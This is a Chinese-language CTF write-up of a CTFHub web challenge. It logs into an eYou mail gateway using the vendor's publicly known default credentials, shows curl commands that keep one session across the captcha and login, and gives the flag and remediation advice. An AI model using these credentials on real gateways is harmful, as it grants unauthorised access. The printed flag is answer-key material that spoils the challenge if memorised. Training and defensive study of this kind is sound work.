CTFHub - Web - 密码口令 - 默认口令

# CTFHub # Web # 密码口令 # 默认口令 # 亿邮

一、题目信息

  • 题目名称：默认口令
  • 题目方向：Web - 密码口令
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：使用产品默认账号登录后台并获取 flag。

二、识别目标产品

访问根路径后，页面标题为“CTFHub——亿邮邮件网关”，登录表单包含以下字段：

user_id=用户名
user_pass=密码
captcha=验证码
captcha_ctime=验证码时间

页面同时加载 code.php 生成验证码图片。根据“亿邮邮件网关”这一产品名称，可以进一步查找其公开默认口令。

三、查找默认口令

公开资料中常见的亿邮邮件网关测试账号为：

用户名：eyougw
密码：admin@(eyou)

默认口令属于产品部署后未修改的初始凭据。很多设备和管理系统都会在安装文档、测试环境或用户手册中保留默认账号，若上线后未及时清理，攻击者可以直接获得登录权限。

四、处理验证码并登录

验证码校验依赖 PHP Session，因此获取验证码和提交登录请求必须使用同一个 PHPSESSID：

$base = "http://challenge-xxx.sandbox.ctfhub.com:10800/"

# 1. 访问首页获取 Session
curl.exe -c cookie.txt -b cookie.txt -o index.html $base

# 2. 在同一 Session 中获取验证码
curl.exe -c cookie.txt -b cookie.txt -o captcha.png "${base}code.php"

# 3. 识别图片中的验证码后提交
curl.exe -i -c cookie.txt -b cookie.txt -X POST ^
  --data-urlencode "user_id=eyougw" ^
  --data-urlencode "user_pass=admin@(eyou)" ^
  --data-urlencode "captcha=ZC1E" ^
  --data-urlencode "captcha_ctime=" ^
  "${base}login.php?mod=login"

本次验证码识别结果为 ZC1E。提交默认凭据后，服务端返回：

Hello CTFHub eyougw admin, ctfhub{...}
验证码与动态实例相关，不能直接套用示例中的 ZC1E。关键是保持验证码获取和登录提交使用同一个 Cookie 会话。

五、最终 Flag

ctfhub{50073960eca94140fa56e780}

六、修复建议

  • 设备或系统部署完成后立即修改所有默认账号和默认密码。
  • 不要在生产环境中保留厂商测试账号、演示账号或安装文档中的初始凭据。
  • 对管理后台增加登录失败限制、多因素认证和来源 IP 限制。
  • 定期检查公开文档和配置文件中是否包含默认凭据，并纳入安全基线审计。

七、解题总结

本题的核心是产品指纹识别和默认口令检索。识别出“亿邮邮件网关”后，使用公开默认账号即可绕过后台登录。验证码只是会话校验环节，不影响默认凭据本身的风险。
